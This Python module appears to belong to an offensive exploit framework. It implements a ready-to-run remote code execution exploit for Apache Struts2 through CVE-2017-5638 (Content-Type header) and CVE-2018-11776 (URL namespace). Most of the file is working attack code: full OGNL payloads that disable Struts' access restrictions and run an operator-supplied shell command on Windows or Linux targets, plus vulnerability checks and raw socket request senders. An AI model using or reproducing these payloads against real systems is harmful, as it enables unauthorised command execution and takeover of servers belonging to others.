"""
Apache Struts2 Remote Code Execution Exploits
Multiple CVEs affecting Struts2 framework.
"""

import asyncio
import socket
import urllib.parse
import base64
from ..templates.base_exploit import BaseExploit

class ApacheStruts2RCE(BaseExploit):
    """Apache Struts2 Remote Code Execution exploit (multiple CVEs)."""
    
    name = "Apache Struts2 RCE (Multiple CVEs)"
    description = "Remote code execution in Apache Struts2 framework"
    author = "CypherFramework Team"
    version = "1.0"
    
    # Exploit metadata
    cve = "CVE-2017-5638"  # Primary CVE, supports multiple
    references = [
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638",
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11776"
    ]
    target_os = ["linux", "windows"]
    target_services = ["http", "https"]
    difficulty = "easy"
    reliability = "excellent"
    
    def _default_options(self):
        return {
            'RHOSTS': {'value': '', 'required': True, 'description': 'Target host(s)'},
            'RPORT': {'value': 8080, 'required': True, 'description': 'Target HTTP port'},
            'TARGETURI': {'value': '/struts2-showcase/', 'required': True, 'description': 'Target URI path'},
            'CMD': {'value': 'id', 'required': False, 'description': 'Command to execute'},
            'CVE': {'value': 'CVE-2017-5638', 'required': False, 'description': 'CVE to exploit'},
            'SSL': {'value': False, 'required': False, 'description': 'Use HTTPS'},
            'TIMEOUT': {'value': 30, 'required': False, 'description': 'Connection timeout'},
        }
        
    def _required_options(self):
        return ['RHOSTS', 'RPORT']
        
    async def check(self, target):
        """Check if target is vulnerable to Struts2 RCE."""
        host = self.get_option('RHOSTS')
        port = self.get_option('RPORT')
        uri = self.get_option('TARGETURI')
        ssl = self.get_option('SSL')
        timeout = self.get_option('TIMEOUT')
        cve = self.get_option('CVE')
        
        try:
            # Try different Struts2 detection methods based on CVE
            if cve == 'CVE-2017-5638':
                return await self._check_cve_2017_5638(host, port, uri, ssl, timeout)
            elif cve == 'CVE-2018-11776':
                return await self._check_cve_2018_11776(host, port, uri, ssl, timeout)
            else:
                # Generic Struts2 detection
                return await self._check_generic_struts2(host, port, uri, ssl, timeout)
                
        except Exception as e:
            return {
                'vulnerable': False,
                'confidence': 0.1,
                'details': f'Check failed: {str(e)}'
            }
            
    async def _check_cve_2017_5638(self, host, port, uri, ssl, timeout):
        """Check for CVE-2017-5638 (Content-Type header injection)."""
        # Create detection payload in Content-Type header
        detection_payload = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo struts2_test').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
        
        # Build HTTP request with malicious Content-Type
        request_data = "test=data"
        request_line = f"POST {uri} HTTP/1.1\r\n"
        request_line += f"Host: {host}:{port}\r\n"
        request_line += f"Content-Type: {detection_payload}\r\n"
        request_line += f"Content-Length: {len(request_data)}\r\n"
        request_line += "Connection: close\r\n"
        request_line += "\r\n"
        request_line += request_data
        
        response = await self._send_http_request(host, port, request_line, ssl, timeout)
        
        if response and b'struts2_test' in response:
            return {
                'vulnerable': True,
                'confidence': 0.95,
                'details': 'CVE-2017-5638 confirmed via Content-Type injection'
            }
        elif response and (b'struts' in response.lower() or b'action' in response.lower()):
            return {
                'vulnerable': True,
                'confidence': 0.7,
                'details': 'Struts2 application detected, likely vulnerable'
            }
        else:
            return {
                'vulnerable': False,
                'confidence': 0.6,
                'details': 'No Struts2 vulnerability indicators found'
            }
            
    async def _check_cve_2018_11776(self, host, port, uri, ssl, timeout):
        """Check for CVE-2018-11776 (namespace injection)."""
        # Create detection payload in URL namespace
        detection_payload = "${(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo struts2_namespace_test').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
        
        # URL encode the payload
        encoded_payload = urllib.parse.quote(detection_payload, safe='')
        malicious_uri = f"/{encoded_payload}{uri}"
        
        request_line = f"GET {malicious_uri} HTTP/1.1\r\n"
        request_line += f"Host: {host}:{port}\r\n"
        request_line += "User-Agent: Mozilla/5.0\r\n"
        request_line += "Connection: close\r\n"
        request_line += "\r\n"
        
        response = await self._send_http_request(host, port, request_line, ssl, timeout)
        
        if response and b'struts2_namespace_test' in response:
            return {
                'vulnerable': True,
                'confidence': 0.95,
                'details': 'CVE-2018-11776 confirmed via namespace injection'
            }
        else:
            return {
                'vulnerable': False,
                'confidence': 0.6,
                'details': 'No CVE-2018-11776 vulnerability found'
            }
            
    async def _check_generic_struts2(self, host, port, uri, ssl, timeout):
        """Generic Struts2 application detection."""
        request_line = f"GET {uri} HTTP/1.1\r\n"
        request_line += f"Host: {host}:{port}\r\n"
        request_line += "User-Agent: Mozilla/5.0\r\n"
        request_line += "Connection: close\r\n"
        request_line += "\r\n"
        
        response = await self._send_http_request(host, port, request_line, ssl, timeout)
        
        if response:
            struts_indicators = [
                b'struts',
                b'action',
                b'.action',
                b'xwork',
                b'ognl'
            ]
            
            response_lower = response.lower()
            for indicator in struts_indicators:
                if indicator in response_lower:
                    return {
                        'vulnerable': True,
                        'confidence': 0.6,
                        'details': f'Struts2 application detected: {indicator.decode()}'
                    }
                    
        return {
            'vulnerable': False,
            'confidence': 0.5,
            'details': 'No Struts2 application detected'
        }
        
    async def run(self, target):
        """Execute the Struts2 RCE exploit."""
        # Validate options
        validation = self.validate_options()
        if not validation['valid']:
            return {
                'success': False,
                'error': f"Missing required options: {validation['missing']}"
            }
            
        host = self.get_option('RHOSTS')
        port = self.get_option('RPORT')
        uri = self.get_option('TARGETURI')
        cmd = self.get_option('CMD')
        cve = self.get_option('CVE')
        ssl = self.get_option('SSL')
        timeout = self.get_option('TIMEOUT')
        
        # Check vulnerability first
        check_result = await self.check(target)
        if not check_result['vulnerable']:
            return {
                'success': False,
                'error': f'Target does not appear vulnerable to {cve}',
                'check_result': check_result
            }
            
        try:
            # Execute exploit based on CVE
            if cve == 'CVE-2017-5638':
                result = await self._exploit_cve_2017_5638(host, port, uri, cmd, ssl, timeout)
            elif cve == 'CVE-2018-11776':
                result = await self._exploit_cve_2018_11776(host, port, uri, cmd, ssl, timeout)
            else:
                result = await self._exploit_cve_2017_5638(host, port, uri, cmd, ssl, timeout)
                
            return result
            
        except Exception as e:
            return {
                'success': False,
                'error': f'Exploit execution failed: {str(e)}'
            }
            
    async def _exploit_cve_2017_5638(self, host, port, uri, cmd, ssl, timeout):
        """Exploit CVE-2017-5638 via Content-Type header."""
        # Create OGNL payload for command execution
        ognl_payload = f"%{{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='{cmd}').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{{'cmd.exe','/c',#cmd}}:{{'/bin/bash','-c',#cmd}})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}}"
        
        # Build HTTP request
        request_data = "test=exploit"
        request_line = f"POST {uri} HTTP/1.1\r\n"
        request_line += f"Host: {host}:{port}\r\n"
        request_line += f"Content-Type: {ognl_payload}\r\n"
        request_line += f"Content-Length: {len(request_data)}\r\n"
        request_line += "Connection: close\r\n"
        request_line += "\r\n"
        request_line += request_data
        
        response = await self._send_http_request(host, port, request_line, ssl, timeout)
        
        if response:
            # Extract command output
            output = self._extract_response_body(response)
            
            return {
                'success': True,
                'output': output,
                'command': cmd,
                'target': f"{host}:{port}",
                'exploit': 'Struts2 CVE-2017-5638'
            }
        else:
            return {
                'success': False,
                'error': 'Failed to send exploit payload'
            }
            
    async def _exploit_cve_2018_11776(self, host, port, uri, cmd, ssl, timeout):
        """Exploit CVE-2018-11776 via namespace injection."""
        # Create OGNL payload for namespace injection
        ognl_payload = f"${{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='{cmd}').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{{'cmd.exe','/c',#cmd}}:{{'/bin/bash','-c',#cmd}})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}}"
        
        # URL encode and inject into namespace
        encoded_payload = urllib.parse.quote(ognl_payload, safe='')
        malicious_uri = f"/{encoded_payload}{uri}"
        
        request_line = f"GET {malicious_uri} HTTP/1.1\r\n"
        request_line += f"Host: {host}:{port}\r\n"
        request_line += "User-Agent: Mozilla/5.0\r\n"
        request_line += "Connection: close\r\n"
        request_line += "\r\n"
        
        response = await self._send_http_request(host, port, request_line, ssl, timeout)
        
        if response:
            output = self._extract_response_body(response)
            
            return {
                'success': True,
                'output': output,
                'command': cmd,
                'target': f"{host}:{port}",
                'exploit': 'Struts2 CVE-2018-11776'
            }
        else:
            return {
                'success': False,
                'error': 'Failed to send exploit payload'
            }
            
    async def _send_http_request(self, host, port, request, ssl, timeout):
        """Send HTTP request and return response."""
        try:
            if ssl:
                import ssl as ssl_module
                context = ssl_module.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl_module.CERT_NONE
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                sock = context.wrap_socket(sock, server_hostname=host)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                
            sock.connect((host, port))
            sock.send(request.encode())
            
            # Receive response
            response = b""
            while True:
                try:
                    data = sock.recv(4096)
                    if not data:
                        break
                    response += data
                except socket.timeout:
                    break
                    
            sock.close()
            return response
            
        except Exception as e:
            raise Exception(f"HTTP request failed: {str(e)}")
            
    def _extract_response_body(self, response):
        """Extract body from HTTP response."""
        try:
            response_str = response.decode('utf-8', errors='ignore')
            if '\r\n\r\n' in response_str:
                return response_str.split('\r\n\r\n', 1)[1]
            else:
                return response_str
        except:
            return response.decode('utf-8', errors='ignore')